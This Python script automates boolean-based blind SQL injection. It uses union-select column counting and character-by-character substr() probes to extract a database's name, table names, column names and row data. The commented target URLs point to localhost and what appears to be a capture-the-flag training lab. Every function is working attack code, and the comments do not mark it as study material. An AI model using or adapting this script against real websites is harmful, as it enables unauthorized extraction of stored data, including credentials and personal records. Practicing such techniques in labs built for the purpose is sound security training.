import requests
from bs4 import BeautifulSoup


def getColumnNumber(url):
    ColumnNumber=1
    query="?id=1 union select 1"
    r = requests.get(url + query)
    print(url + query)
    r.encoding = r.apparent_encoding
    message = r.text
    soup = BeautifulSoup(message, "html.parser")
    while len(soup.find_all("font")) == 0:
        query+=",1"
        print(url+query)
        r = requests.get(url + query)
        r.encoding = r.apparent_encoding
        message = r.text
        soup = BeautifulSoup(message, "html.parser")
        ColumnNumber+=1
    return "你的字段数是:"+str(ColumnNumber)



def getDBlength(url):
    length=1
    query="?id=1\" and length(database())="+str(length)
    r=requests.get(url+query+" and \"\"=\"")
    print(url+query+" and \"\"=\"")
    r.encoding=r.apparent_encoding
    message=r.text
    soup=BeautifulSoup(message,"html.parser")

    while len(soup.find_all("font"))==0:
        length+=1
        query="?id=1\" and length(database())="+str(length)
        print(url+query+" and \"\"=\"")
        r=requests.get(url+query+" and \"\"=\"")
        r.encoding=r.apparent_encoding
        message=r.text
        soup=BeautifulSoup(message,"html.parser")
    return "数据库的长度是:"+str(length)

def getDBname(url,length):
    DBname=""
    for i in range(length+1):
        for word in "abcdefghijklmnopqrstuvwxyz1234567890,!@#$%^&*()_-":
            query="?id=1\" and substr(database(),{},1)=\"{}\" and \"\"=\"".format(i,word)
            r = requests.get(url + query)
            print(url + query)
            r.encoding = r.apparent_encoding
            message = r.text
            soup = BeautifulSoup(message, "html.parser")
            if len(soup.find_all("font"))==0:
                print("Wrong")
            else:
                DBname+=word
    return "数据库的名字是:"+DBname

def getTableName(url):
    TableName=""
    for j in range(1,50):
        for i in "abcdefghijklmnopqrstuvwxyz1234567890,!@*.^%$":
            query="?id=1\" and substr((select group_concat(table_name) from information_schema.tables " \
          "where table_schema=database() limit 0,1),{},1)='{}'".format(j,i)
            r = requests.get(url + query+" and \"\"=\"")
            print(url + query+" and \"\"=\"")
            r.encoding = r.apparent_encoding
            message = r.text
            soup = BeautifulSoup(message, "html.parser")

            if len(soup.find_all("font"))==0:
                print("Wrong")
            else:
                TableName+=i
    return "你的表的名称是:"+TableName

def getColumnName(url,tableName):
    ColumnName=""
    for i in range(1,50):
        for word in  "abcdefghijklmnopqrstuvwxyz1234567890,!@#$%^&*_-()":
            query="?id=1\" and substr((select group_concat(column_name) from information_schema.columns " \
                    "where table_schema=database() and table_name='{}' limit 0,1),{},1)='{}'".format(tableName,i,word)
            r = requests.get(url + query+" and \"\"=\"")
            print(url + query)
            r.encoding = r.apparent_encoding
            message = r.text
            soup = BeautifulSoup(message, "html.parser")

            if len(soup.find_all("font"))==0:
                print("Wrong")
            else:
                ColumnName+=word
                continue
    return "{}的字段分别为{}".format(tableName,ColumnName)

def find_data(url,tableName,column):
    Data=""
    for i in range(1,60):
        for word in "abcdefghijklmnopqrstuwxyz!@#$%^&*()_-,":
            query="?id=1\" and substr((select group_concat({}) from {}),{},1)='{}'".format(column,tableName,i,word)
            r = requests.get(url + query+" and \"\"=\"")
            print(url + query)
            r.encoding = r.apparent_encoding
            message = r.text
            soup = BeautifulSoup(message, "html.parser")

            if len(soup.find_all("font")) == 0:
                print("Wrong")
            else:
                Data += word
                continue

    return "{}里面的数据为{}".format(column,Data)

# print(getDBlength("http://127.0.0.1/BoolSQL.php"))
# print(find_data("http://127.0.0.1/BoolSQL.php","hello","grade"))

# print(getDBlength("http://injectx1.lab.aqlab.cn:81/Pass-10/index.php"))
# print(getDBname("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php",12))
# print(getTableName("http://injectx1.lab.aqlab.cn:81/Pass-10/index.php"))
# print(getColumnName("http://injectx1.lab.aqlab.cn:81/Pass-10/index.php","loflag"))
# print(find_data("http://injectx1.lab.aqlab.cn:81/Pass-10/index.php","loflag","flaglo"))

# print(getDBlength("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php"))
# print(getDBname("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php",12))
# print(getTableName("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php"))
# print(getColumnName("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php","loflag"))
print(find_data("http://injectx1.lab.aqlab.cn:81/Pass-11/index.php","loflag","flaglo"))